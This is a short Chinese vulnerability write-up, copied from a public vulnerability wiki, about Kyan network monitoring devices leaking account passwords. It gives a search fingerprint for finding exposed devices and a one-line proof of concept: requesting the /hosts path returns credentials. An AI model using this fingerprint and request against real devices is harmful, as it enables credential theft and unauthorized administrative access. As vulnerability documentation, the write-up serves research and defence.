---
title: "Kyan 网络监控设备 hosts 账号密码泄露漏洞"
date: 2026-10-18 09:14:57
categories:
  - WebSecurity
  - CVE
  - "IoT"
  - "Kyan"
tags:
  - "Kyan"
  - "漏洞复现"
---
## 漏洞描述

Kyan 网络监控设备 存在账号密码泄露漏洞，攻击者通过漏洞可以获得账号密码和后台权限

## 漏洞影响

```
Kyan
```

## 网络测绘

```
title="platform - Login"
```

## 漏洞复现

登录页面如下

![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/202202140926162.png)

POC

```plain
http://xxx.xxx.xxx.xxx/hosts
```

![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/202202140927595.png)

成功获得账号密码

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/iot/Kyan-%E7%BD%91%E7%BB%9C%E7%9B%91%E6%8E%A7%E8%AE%BE%E5%A4%87-hosts-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E.md)
